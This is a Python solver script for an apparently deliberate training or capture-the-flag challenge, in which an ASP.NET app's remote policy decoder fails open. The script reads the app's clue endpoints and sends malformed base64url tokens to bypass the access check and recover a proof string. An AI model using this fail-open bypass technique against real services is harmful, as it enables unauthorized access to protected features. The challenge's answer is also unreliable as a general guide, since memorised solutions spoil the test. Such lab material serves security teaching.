#!/usr/bin/env python3
"""Generic solver for day-24-fail-open-friday (fail-open remote policy decoder).

The app (ASP.NET Core Razor Pages) gates a feature route behind a "remote policy
decoder": the caller passes a policy token as a query parameter, shaped
`<prefix><base64url JSON decision>`. /api/clues discloses the feature_route and a
policy_format_route; the format route discloses the exact query-parameter name,
the token prefix, the encoding, and a documented *valid public* decision
({"Scope":"public","Allow":true}).

The bug: the decoder FAILS OPEN. A well-formed public decision only unlocks the
"standard" policy response, but a token whose payload cannot be decoded at all
(malformed base64url / non-JSON) hits an exception path that grants the
protected effect and returns the proof - the exact opposite of the disclosed
expected_behavior ("deny access when the policy service is unavailable").

Generic: every route, parameter name and prefix is derived from the live
target's own /api/clues and policy_format responses; nothing per-attempt is
hard-coded. Talks only to the one target origin given on the command line.

Usage: python3 solve.py <target_base_url>
"""
import base64
import json
import re
import sys
import urllib.parse
import urllib.request
import http.cookiejar

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36")
PROOF_RE = re.compile(r"proof_[0-9a-fA-F]{16,}")


def get(opener, url):
    req = urllib.request.Request(url, headers={"User-Agent": UA})
    try:
        with opener.open(req, timeout=30) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as err:
        return err.code, err.read().decode("utf-8", "replace")


def main():
    base = sys.argv[1].rstrip("/")
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

    status, body = get(opener, base + "/api/clues")
    clues = json.loads(body)
    feature = clues["feature_route"]
    format_route = clues["policy_format_route"]

    status, body = get(opener, base + format_route)
    fmt = json.loads(body)
    param = fmt["query_parameter"]
    prefix = fmt["prefix"]

    # Baseline: the documented valid public decision only yields the standard
    # response (no proof) - confirms the decoder is really part of the decision.
    sample = fmt.get("sample_encoded")
    if sample:
        status, body = get(opener, f"{base}{feature}?{urllib.parse.urlencode({param: prefix + sample})}")
        print("valid public decision ->", body.strip(), file=sys.stderr)

    # Exploit: an undecodable payload after a well-formed prefix fails open.
    # Try malformed base64url first, then base64url of non-JSON bytes.
    for payload in ("not-valid-base64!!!",
                    base64.urlsafe_b64encode(b"\x00\x01\x02not json").decode().rstrip("=")):
        token = prefix + payload
        status, body = get(opener, f"{base}{feature}?{urllib.parse.urlencode({param: token})}")
        print(f"undecodable policy ({payload[:24]}...) ->", body.strip(), file=sys.stderr)
        match = PROOF_RE.search(body)
        if match:
            print(match.group(0))
            return
    sys.exit("no proof recovered")


if __name__ == "__main__":
    main()
